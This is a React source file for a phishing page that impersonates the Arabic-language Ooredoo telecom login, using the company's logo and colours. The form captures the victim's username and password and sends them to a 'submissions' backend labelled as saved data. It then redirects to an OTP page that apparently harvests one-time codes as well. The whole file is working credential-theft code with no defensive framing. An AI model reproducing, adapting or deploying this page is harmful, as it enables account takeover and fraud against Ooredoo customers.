import { useState } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

export default function Ooredoo() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const sessionId = localStorage.getItem("sessionId") || "";

  const [ooredooUser, setOoredooUser] = useState("");
  const [ooredooPassword, setOoredooPassword] = useState("");
  const submitOoredooMutation = trpc.submissions.submitOoredoo.useMutation();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      await submitOoredooMutation.mutateAsync({
        sessionId,
        ooredooUser,
        ooredooPassword,
      });
      toast.success("تم حفظ البيانات بنجاح");
      setLocation(`/otp-ooredoo?session=${sessionId}`);
    } catch (error) {
      toast.error("حدث خطأ في حفظ البيانات");
    }
  };

  return (
    <html lang="ar" dir="rtl">
      <head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <title>تسجيل الدخول</title>
        <style>{`
          @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
          body { font-family: 'Cairo', sans-serif; background-color: #ffffff; margin: 0; padding: 0; display: flex; justify-content: center; }
          .container { width: 100%; max-width: 500px; box-sizing: border-box; }
          
          header { padding: 15px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #f0f0f0; background-color: #ffffff; }
          .menu-icon { font-size: 24px; cursor: pointer; color: #d71920; font-weight: bold; width: 40px; }
          .logo-container { flex-grow: 1; display: flex; align-items: center; justify-content: center; background-color: #ffffff !important; }
          .logo-container img { height: 35px; width: auto; display: block; }
          
          .lang-switch { width: 50px; text-align: center; font-size: 10px; color: #d71920; border: 1px solid #d71920; padding: 3px 5px; border-radius: 12px; cursor: pointer; font-weight: bold; }

          .content-body { padding: 20px; }
          h1 { font-size: 24px; color: #333; margin-top: 20px; margin-bottom: 10px; }
          .sub-text { color: #666; font-size: 14px; margin-bottom: 25px; }
          .input-group { margin-bottom: 15px; }
          input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
          .forgot-pass { color: #d71920; font-size: 14px; display: block; margin: 10px 0 25px 0; text-decoration: underline; cursor: pointer; }
          .login-btn { width: 100%; padding: 15px; background-color: #d71920; color: white; border: none; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; max-width: 300px; margin: 0 auto; display: block; }
        `}</style>
      </head>
      <body>
        <div className="container">
          <header>
            <div className="menu-icon">☰</div>
            <div className="logo-container">
              <img src="https://upload.wikimedia.org/wikipedia/commons/e/e0/Ooredoo_logo.svg" alt="Ooredoo Logo" />
            </div>
            <div className="lang-switch" onClick={() => setLocation("/ooredoo-en")} style={{ cursor: "pointer" }}>
              English
            </div>
          </header>
          <div className="content-body">
            <h1>تسجيل الدخول</h1>
            <p className="sub-text">تسجيل الدخول باستخدام اسم المستخدم وكلمة المرور.</p>
            <form onSubmit={handleSubmit}>
              <div className="input-group">
                <input
                  type="text"
                  placeholder="البريد الإلكتروني أو اسم المستخدم"
                  value={ooredooUser}
                  onChange={(e) => setOoredooUser(e.target.value)}
                  required
                />
              </div>
              <div className="input-group">
                <input
                  type="password"
                  placeholder="كلمة المرور"
                  value={ooredooPassword}
                  onChange={(e) => setOoredooPassword(e.target.value)}
                  required
                />
              </div>
              <span className="forgot-pass">هل نسيت كلمة المرور؟</span>
              <button type="submit" className="login-btn">
                تسجيل الدخول
              </button>
            </form>
          </div>
        </div>
      </body>
    </html>
  );
}
